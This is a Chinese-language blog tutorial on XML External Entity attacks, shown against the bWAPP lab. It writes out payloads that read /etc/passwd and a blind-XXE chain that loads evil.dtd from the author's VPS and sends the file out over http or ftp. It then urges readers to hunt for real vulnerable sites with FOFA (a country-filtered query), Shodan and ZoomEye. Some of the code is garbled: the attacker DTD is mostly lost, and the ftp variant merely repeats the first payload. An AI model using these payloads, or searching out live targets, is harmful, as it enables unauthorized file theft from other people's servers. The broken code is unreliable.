原创： K  合天智汇

  

本篇是依葫芦画瓢，进行了测试和讲解。

先提醒，没有实际例子，本人挖洞经验太少，没有遇到相关例子，文末会给出合适的方法寻找，有兴趣可以去具体操作下。

下面有些文字和图是不同时间配的，导致不一样，道理是一样的。

 **一、xml基础知识**

XML 被设计用来传输和存储数据，现在用的比较广泛的是json数据传输

在支付，登陆可见xml的type，前几个月的微信支付xxe攻击，链接 <http://www.freebuf.com/vuls/176758.html>

其他的语法知识，不做讨论，较简单，同时也较严格的语法

关键点：

作者在一篇文章中看到一个容易理解的利用，链接：<https://www.cnblogs.com/r00tuser/p/7255939.html>

引用如下：（这三种个人觉得能解决读者对于xml的dtd文档引用的问题，就不搬抄过来了，有兴趣多读点文章也不错）

直接通过DTD外部实体声明

通过DTD文档引入外部DTD文档，再引入外部实体声明

通过DTD外部实体声明引入外部实体声明

 **二、xxe攻击产生原因和防御xxe攻击**

一切的输入经过控制修改，服务端执行，变得不再安全；xml被执行也不例外，由于外部实体可被引用，加上我们修改了客户端的执行代码，服务端也没有对代码进行过滤等操作，就解析了我们的恶意代码.

同样防御也简单，过滤或者禁止加载外部实体

 **三、xxe攻击本地搭建环境**

这里作者使用bwapp的环境进行演示

bee的环境很有趣，也很完善，可以学会很多东西，所以如果你是入门的小菜，对渗透不是很了解，可以考虑它（当然不得不说的是本人也是小菜）

ok，开始我们的攻击测试：  

第一步：

bp抓包repeater

![图片.png](https://image.3001.net/images/20181108/1541648958_5be3b23e7d4d8.png!small)  

这里有三点需要注意

1是text/xml存在，说明可能存在xxe攻击，这也是发现xxe攻击的方法

2是有回显，或者没有回显，就只有blind测试了

第二步：

接下来构建我们的攻击代码

![图片.png](https://image.3001.net/images/20181108/1541648966_5be3b2467cbaa.png!small)  

我们这里来分析一下

XML的外部实体“bee”被赋予的值为：file:///etc/passwd，当解析xml文档时，bee会被替换为file:///ect/passwd的内容。就被执行回显回来了。

第三步：

如果满足有text/xml类型而没有回显，无法判断我们的代码被执行否

这时候，就需要blind xxe（其实实际比较方便的思路可以直接blind xxe）

blind xxe思路：

1.我们发送代码过去，服务端执行

2.服务端解析代码，向vps指定文件发送请求，并执行文件读取

3.把解析的代码结果再次发给我们的vps

4.我们的vps，作者了解到有这几种方法查看结果，一是ftp协议，二个是http协议查看日志或者执行网站操作，下面作者将实际演示（这是根据xml支持的协议来操作的）

首先，我们看下我们的服务器日志，便于和后面进行比较

![图片.png](https://image.3001.net/images/20181108/1541648981_5be3b25589852.png!small)  

再修改我们的代码

![图片.png](https://image.3001.net/images/20181108/1541648988_5be3b25ca72d2.png!small)  

这里我们用了http协议去连接我们的服务器，为了区别作者构建了个不存在的路径，所以有了下面这个情况，点击发送

![图片.png](https://image.3001.net/images/20181108/1541657024_5be3d1c0b1801.png!small)  

查看日志

![图片.png](https://image.3001.net/images/20181108/1541657032_5be3d1c85d738.png!small)  

显示404 路径不存在；嗯，证明可以加载外部实体

第四步：

ok，继续构造我们的代码

构造三部分内容：

第一部分：

我们的bp的发送代码，向vps发送申请

  1. `<?xml version="1.0" encoding="utf-8"?>`

  2. `<!DOCTYPE updateProfile [`

  3. `<!ENTITY % payload SYSTEM "file:///etc/passwd">`

  4. `<!ENTITY % dtd SYSTEM "http://192.168.225.129/evil.dtd">`

  5. `%dtd;`

  6. `%send;`

  7. `]>`

第二部分：

我们请求的vps服务器上<http://192.168.225.129/evil.dtd> 写如下代码

"

>

> %all;

这里作者提一下注意的问题

1.file=///etc/passwd 运用file协议来读取

2.%； 是%
实体化（为什么要用，作者也不是很清楚，自己开始直接用%，没有发送出去请求，然后翻阅了其他的文章和攻击代码，发现entity里面都是实体化了的）

3.web服务端执行了/etc/passwd的读取， 然后又发送给了vps（payload变量携带数据）

4.还有一个很重要的语法知识，闭合，取得vps上的语句进行参数的前后闭合（作者自己的浅显理解）

老实说，作者在这里吃过亏，靶机和自己vps主机的语句连起来要构成一个闭合语句，因为只执行了一次xml执行函数

点击，我们来发送请求：

  
![图片.png](https://image.3001.net/images/20181108/1541657062_5be3d1e666668.png!small)  

可以看到，时间相同或者说接近（这就是为什么闭合的原因，只有一次执行机会，提醒了，因为作者吃过亏），受害主机解析了我们vps上的evil.xml，再次向我们的vps发送了数据

但是没有数据，作者也疑惑，然后一番测试：

将进行修改

改为：

1.测试payload换成其他的不规则样式，发现是显示的，证明是payload参数没有获得数据

如：改为 那么id就等于abc了

2.payload参数前面的%换成&，报错，不发送vps上的语句

3.实体化%，不发送vps上的语句

4.data协议 data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk

虽然data协议官方文档说是要allowurlfopen和，allowurlinclude配置的限制，但是本地测试时还是可以利用（allowurlfopen默认on，allowurlinclude默认off）

5.引号内换成：php://filter/read=convert.base64-encode/resource=file:///etc/passwd

6.甚至于作者怀疑用户没有权限读。。。当然有

第二部分也可以这样写：（当然不服，换ftp协议）

将evil.dtd 修改如此即可

  1. `<?xml version="1.0" encoding="utf-8"?>`

  2. `<!DOCTYPE updateProfile [`

  3. `<!ENTITY % payload SYSTEM "file:///etc/passwd">`

  4. `<!ENTITY % dtd SYSTEM "ftp://192.168.225.129/%payload;">`

  5. `%dtd;`

  6. `%send;`

  7. `]>`

  
![图片.png](https://image.3001.net/images/20181108/1541657077_5be3d1f5cd444.png!small)  

  
![图片.png](https://image.3001.net/images/20181108/1541657083_5be3d1fb36ba9.png!small)  

这种并没有登陆仅仅是端口对应正确

![图片.png](https://image.3001.net/images/20181108/1541657091_5be3d2037c80a.png!small)  

而作者的kali主机根本没有开启ftp服务；而我们连接的ftp://vps:21仅仅满足了21端口，ftp协议并没有满足；格式
ftp://user:password@host:port

ok，我们不再纠结，继续

不得不提的是，这是协议的发送，上面是http协议，这是ftp协议

xml支持的协议（注意看，只有三种，而我们也只用了三种）

  
![图片.png](https://image.3001.net/images/20181108/1541657099_5be3d20b62372.png!small)  

第五步：（后续利用部分大部分都能找到，就不丢人了）

xxe攻击还可以做很多事，关键看dtd文件怎样构造

有dos攻击

判断端口

判断服务

内网探测（即ssrf）

 **四、xxe攻击实例寻找**

免费使用搜索结果是有限制的

毕竟这两个是大杀器

1.<https://fofa.so/>

header=xml && country=IN （读者可以自行搜索试下）

2.[www.shodan.io](http://www.shodan.io) （无研究，需head中有text/xml思路即可）

简单语法：

port 端口

os 操作系统类型

org 组织机构或公司名

city 城市

country 国家

product 软件或产品

vuln CVE漏洞编号

3.钟馗之眼

 **五、总结**

1.外部引用system “url/dtd”

2.普通的回显

3.没有回显的，blind xxe 就是回显数据到vps上

4.写一篇图文并茂的文章是很花时间的，特别是对于作者这样的小菜，但是也在文章书写过程中探究一些平时不愿探究的为什么，一件事没有动力确实很难去做。

